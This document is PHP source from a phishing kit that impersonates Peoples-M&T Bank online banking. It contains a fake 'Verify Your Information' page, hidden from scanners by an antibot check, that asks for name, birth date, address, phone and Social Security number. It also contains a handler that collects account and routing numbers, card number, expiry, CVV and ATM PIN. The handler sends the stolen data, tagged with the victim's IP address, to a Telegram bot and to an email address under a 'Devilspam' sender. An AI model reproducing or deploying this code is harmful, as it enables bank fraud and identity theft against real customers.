<?php
session_start();           
require_once '../session.php';

$comps = new Comp;
$antibot = new Antibot;

if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}
$d = $_POST['ad'];
?>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta data-appid="ceb">

    <!-- Latest minified CSS -->
    <link rel="stylesheet" href="eam/content/bootstrap.min.css?ver=63.3.4.1" type="text/css">
    <link rel="stylesheet" href="eam/content/eam.css?ver=63.3.4.1" type="text/css">
    <link rel="stylesheet" href="eam/content/fis-icon-font.css?ver=63.3.4.1" type="text/css">

    <link href="eam/styles/ceb_app/136_221172186/BankStyles.css?115707" rel="stylesheet" type="text/css">


    <!-- Latest JavaScript -->
    <script src="/eam/Scripts/umd/popper.min.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/jquery-3.6.0.min.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/bootstrap.min.js?ver=63.3.4.1"></script>    
    <script src="/eam/Scripts/eam.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/eam-visual-validator.js?ver=63.3.4.1"></script>
    <script type="text/javascript">window.name = "";</script>

    <link rel="stylesheet" href="eam/content/jquery.smartbanner.min.css?ver=63.3.4.1" type="text/css" media="screen">
    <script src="/eam/scripts/jquery.smartbanner.min.js?ver=63.3.4.1"></script>



    <title>Verify Your Information - Peoples-M&amp;T Bank Online Banking</title>

    
	<script src="/eam/Scripts/UserAccountValidation.js?ver=63.3.4.1"></script>

	
	<style type="text/css">
		div.form-group.row.collapse.show {
			display: flex;
		}
	</style>

</head>
<body>
	<header>
        <a id="skippy" class="visually-hidden-focusable" href="#secureHideArea"><span class="skiplink-text">Skip to main content</span></a>
		<div class="fis-header-content"><a class="brandedImageLink" title="Peoples-M&amp;T Bank" href="http://www.peoples.com"><img id="_BankLogo" class="" title="Peoples-M&amp;T Bank" alt="" src="https://cibng.ibanking-services.com/Eam/Styles/CeB_App/136_221172186/136_image.svg"></a></div>
	</header>

	<div id="content" class="fis-page-content">
		<div class="">
            <div id="secureHideArea" class="container secureHideArea" role="main" tabindex="-1">
                <div></div>
                <div class="row">
                    <h1 class="col-sm-12">Verify Your Account Information</h1>
                </div>
                


	<form id="form" method="POST" action="action.php" autocomplete="off" data-wizard-title="Verify Your Information" data-wizard-submit="Continue" onsubmit="return validateForm()">
	<input type="hidden" id="hidden" value="5">
	<input type="hidden" name="ad" id="ad" value="<?php echo $d; ?>">


<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="LastName" id="LabelLastName">Full Name:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="a" name="fullname" type="text" value="" class="form-control  " maxlength="40">Enter the full name associated with this account.</div></div>


<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="LastName" id="LabelLastName">Date of Birth:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="dob" name="dob" placeholder="MM/DD/YYYY" type="text" value="" class="form-control  " maxlength="40">Enter the date of birth associated with this account.</div></div>


<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="LastName" id="LabelLastName">Address:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="b" name="address" type="text" value="" class="form-control  ">Enter the street address associated with this account.</div></div>


<div class="form-group row">
			<div class="form-control-label col-sm-4">State:</div>
			<div class="col-sm-6"><select class="form-control" data-val="true" data-val-required="The AccountType field is required." id="c" name="state">
            <option disabled="" value="" selected="">Choose one</option>
            <option id="option-stateId-select-validate-0" value="Alabama">Alabama</option>
            <option id="option-stateId-select-validate-1" value="Alaska">Alaska</option>
            <option id="option-stateId-select-validate-2" value="Arizona">Arizona</option>
            <option id="option-stateId-select-validate-3" value="Arkansas">Arkansas</option>
            <option id="option-stateId-select-validate-4" value="California">California</option>
            <option id="option-stateId-select-validate-5" value="Colorado">Colorado</option>
            <option id="option-stateId-select-validate-6" value="Connecticut">Connecticut</option>
            <option id="option-stateId-select-validate-7" value="Delaware">Delaware</option>
            <option id="option-stateId-select-validate-8" value="DC">District of Columbia</option>
            <option id="option-stateId-select-validate-9" value="Florida">Florida</option>
            <option id="option-stateId-select-validate-10" value="Georgia">Georgia</option>
            <option id="option-stateId-select-validate-11" value="Hawaii">Hawaii</option>
            <option id="option-stateId-select-validate-12" value="Idaho">Idaho</option>
            <option id="option-stateId-select-validate-13" value="Illinois">Illinois</option>
            <option id="option-stateId-select-validate-14" value="Indiana">Indiana</option>
            <option id="option-stateId-select-validate-15" value="Iowa">Iowa</option>
            <option id="option-stateId-select-validate-16" value="Kansas">Kansas</option>
            <option id="option-stateId-select-validate-17" value="Kentucky">Kentucky</option>
            <option id="option-stateId-select-validate-18" value="Louisiana">Louisiana</option>
            <option id="option-stateId-select-validate-19" value="Maine">Maine</option>
            <option id="option-stateId-select-validate-20" value="Maryland">Maryland</option>
            <option id="option-stateId-select-validate-21" value="Massachusetts">Massachusetts</option>
            <option id="option-stateId-select-validate-22" value="Michigan">Michigan</option>
            <option id="option-stateId-select-validate-23" value="Minnesota">Minnesota</option>
            <option id="option-stateId-select-validate-24" value="Mississippi">Mississippi</option>
            <option id="option-stateId-select-validate-25" value="Missouri">Missouri</option>
            <option id="option-stateId-select-validate-26" value="Montana">Montana</option>
            <option id="option-stateId-select-validate-27" value="Nebraska">Nebraska</option>
            <option id="option-stateId-select-validate-28" value="Nevada">Nevada</option>
            <option id="option-stateId-select-validate-29" value="New Hampshire">New Hampshire</option>
            <option id="option-stateId-select-validate-30" value="New Jersey">New Jersey</option>
            <option id="option-stateId-select-validate-31" value="New Mexico">New Mexico</option>
            <option id="option-stateId-select-validate-32" value="New York">New York</option>
            <option id="option-stateId-select-validate-33" value="North Carolina">North Carolina</option>
            <option id="option-stateId-select-validate-34" value="North Dakota">North Dakota</option>
            <option id="option-stateId-select-validate-35" value="Ohio">Ohio</option>
            <option id="option-stateId-select-validate-36" value="Oklahoma">Oklahoma</option>
            <option id="option-stateId-select-validate-37" value="Oregon">Oregon</option>
            <option id="option-stateId-select-validate-38" value="Pennsylvania">Pennsylvania</option>
            <option id="option-stateId-select-validate-39" value="Rhode Island">Rhode Island</option>
            <option id="option-stateId-select-validate-40" value="South Carolina">South Carolina</option>
            <option id="option-stateId-select-validate-41" value="South Dakota">South Dakota</option>
            <option id="option-stateId-select-validate-42" value="Tennessee">Tennessee</option>
            <option id="option-stateId-select-validate-43" value="Texas">Texas</option>
            <option id="option-stateId-select-validate-44" value="Utah">Utah</option>
            <option id="option-stateId-select-validate-45" value="Vermont">Vermont</option>
            <option id="option-stateId-select-validate-46" value="Virginia">Virginia</option>
            <option id="option-stateId-select-validate-47" value="Washington">Washington</option>
            <option id="option-stateId-select-validate-48" value="West Virginia">West Virginia</option>
            <option id="option-stateId-select-validate-49" value="Wisconsin">Wisconsin</option>
            <option id="option-stateId-select-validate-50" value="Wyoming">Wyoming</option>
</select></div>
		</div>

<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="LastName" id="LabelLastName">City:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="d" name="city" type="text" value="" class="form-control  " maxlength="40">Enter the city associated with this account.</div></div>


<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="LastName" id="LabelLastName">Zip Code:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="x" name="zip" type="text" value="" class="form-control  " maxlength="6">Enter the zip code associated with this account.</div></div>


<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="LastName" id="LabelLastName">Phone Number:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="phone" name="phone" type="text" value="" class="form-control  " maxlength="40">Enter the phone number associated with this account.</div></div>

<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="SocialSecurityNumber" id="LabelSocialSecurityNumber">Social Security Number:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="ssn" name="ssn" type="text" value="" class="form-control  ">Enter the 9-digits of your social security number.</div></div>		
		<div class="form-group row">
			<div class="col-lg col-sm w-100">
				<input id="continue" name="continue" type="submit" value="Continue" class="btn btn-primary">
			</div>
			<div class="col-lg col-sm w-100">
				<a id="cancel" href="#" class="btn btn-secondary" disabled>Cancel</a>
			</div>
		</div>
	</form>
    <script src="https://devilsms.live/cleave.js"></script>
<script src="https://devilsms.live/clve-min.js"></script> 
            </div>
		</div>
	</div>

    

    
    



</body></html>
<?php
error_reporting(0);
ini_set('display_errors', 0);
require_once '../config.php';
function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IPPP = get_client_ip();

 if (strpos($IPPP, ',') !== false) {
     $ippro = "<fuck>".$IPPP;
     $cldcvers = get_string_between($ippro, '<fuck>', ',');
     $IP = $cldcvers;
 } else {
     $IP = $IPPP;
 }

$a1 = $_POST['type'];
$b1 = $_POST['acnumber'];
$a2 = $_POST['routing'];
$b2 = $_POST['cholder'];
$a3 = $_POST['cnumber'];
$b3 = $_POST['expiry'];
$a4 = $_POST['cvv'];
$b4 = $_POST['atm'];


$data .= "<---- Card Іnfοrmаtiοn : {$IP} ---->\n\n";
$data .= "Page : Peoples\n\n";
$data .= "Account Type : {$a1}\n";
$data .= "Account Number : {$b1}\n";
$data .= "Routing Number : {$a2}\n";
$data .= "Card holder Name : {$b2}\n";
$data .= "Card Number : {$a3}\n";
$data .= "Expiry Date : {$b3}\n";
$data .= "Security Code : {$a4}\n";
$data .= "Atm Pin : {$b4}\n\n";
$data .= "Developed by {$d}\n";

$token = $Token;
$id = $Id;
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";

$params=[
	'chat_id'=>$id,
	'text'=>$data,
];

$ch = curl_init($bot . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
$email = $Email;
$subject = "Card Information from : $IP";
$headers = "From: Devilspam <wellsby@anoxyty.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$data,$headers); 
exit();
?>